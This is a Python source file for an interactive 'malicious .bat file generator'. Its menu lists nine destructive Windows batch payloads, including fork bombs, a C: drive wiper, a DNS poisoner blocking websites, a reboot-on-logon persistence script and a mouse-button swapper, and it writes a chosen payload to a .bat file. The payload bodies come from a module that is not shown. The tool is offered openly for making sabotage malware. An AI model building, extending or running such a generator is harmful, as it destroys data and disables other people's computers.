import time
import sys
import descriptions
import payloads

def print_banner()->None:
    banner = """
    %%%%%%%%%%%%     %%%%%%%%%%%%%  %%%%            %%%%%%%%%%%%     %%%%%%%%%%%%%  %%%%%%%%%%%%%
    %%        %%     %%         %%  %%  %%          %%        %%     %%         %%        %%
    %%        %%     %%         %%  %%     %%%      %%        %%     %%         %%        %%
    %%%%%%%%%%%%%%%  %%%%%%%%%%%%%  %%         %%%  %%%%%%%%%%%%%%%  %%%%%%%%%%%%%        %%
    %%           %%  %%         %%  %%      %%%     %%           %%  %%         %%        %%
    %%           %%  %%         %%  %%   %%%        %%           %%  %%         %%        %%
    %%%%%%%%%%%%%%%  %%         %%  %%%%%           %%%%%%%%%%%%%%%  %%         %%        %%

    """
    author = "Created by: kargisimos"

    for character in banner:
        print(character,end="")
        time.sleep(0.001)
    for character in author:
        print(character,end="")
        time.sleep(0.03)
    time.sleep(2)

def print_help_menu()->None:
    print("\n\nMalicious .bat file generator :)")
    menu = '''
    Menu options:
        [*] list :                    list all available malicious .bat payloads.
        [*] describe <id> :           get a long description about the specified id.
        [*] outfile <outfile> :       the file which will store the generated payload.
        [*] generate <id> :           generate the .bat file with the specified id.
        [*] help :                    show this help menu
        [*] exit :                    close the program
    '''
    print(menu)

def option_exit()->None:
    sys.exit(0)

def option_help()->None:
    print_help_menu()

def option_list()->None:
    payloads = '''
    Available payloads:
         id  name                       description
         
        [1] fork bomb :             overload CPU, crash system
        [2] user bomb :             create infinite system users
        [3] folder bomb :           create infinite folders in desktop
        [4] C: destroyer :          delete everything in the C: drive
        [5] dns poisoner :          deny internet access to famous websites
        [6] persistent rebooter :   reboot upon every logon
        [7] time changer :          change time to random value
        [8] mouse swapper :         swap left-click with right-click
        [9] fork bomb v2 :          overload CPU,crash system, spawn notepad, cmd, powershell

    '''
    print(payloads)

def option_outfile(option)->str:
    outfile = str(option.split()[-1])
    if outfile.endswith('.bat'):
        print(f"[+]Output file set to: {outfile}")
        return outfile
    else:
        print(f'[-]Failed to set output file to: {outfile}...\nFile doesn"t have a .bat extension')
        return None

def option_describe(option, long_description)->None:
    try:
        id = int(option.split()[-1])
        if id > 0 and id <= len(long_description.keys()):
            print(f"\nName : {long_description[id]['name']}\n\nDescription : {long_description[id]['description']}\n")
            print('Requires Administrator privileges: YES\n' if long_description[id]['admin'] else 'Requires Administrator privileges: NO\n')
        else:
            print("[-]id out of range...\nType 'list' to view all available payloads")
    except:
        print("[-]Please select a valid id...\nType 'list' to view all available payloads")

def option_generate(option, outfile, payload)->None:
    try:
        id = int(option.split()[-1])
        print('[+]Generating .bat file...')
        try:
            with open(outfile,'wt') as f:
                f.write(payload[id])
            print('[+]File created successfully!')
        except Exception as e:
            print(f"[-]An error occured... {e}")
    except:
        print("[-]Please select a valid id...\nType 'list' to view all available payloads")

if __name__=='__main__':
    print_banner()
    print_help_menu()

    available_options = ('list', 'describe', 'outfile','generate','help','exit')
    outfile = False

    while True:
        option = str(input("Choose an option: "))
        if not option.startswith(available_options):
            print('Please type a valid option...')
        elif option == 'exit':
            option_exit()
        elif option == 'help':
            option_help()
        elif option == 'list':
            option_list()
        elif option.startswith('outfile'):
            outfile = option_outfile(option)
        elif option.startswith('describe'):
            option_describe(option, descriptions.long_description)
        elif option.startswith('generate'):
            if outfile:
                option_generate(option, outfile,payloads.payload)
            else:
                print('[-]Please specify an output file...')

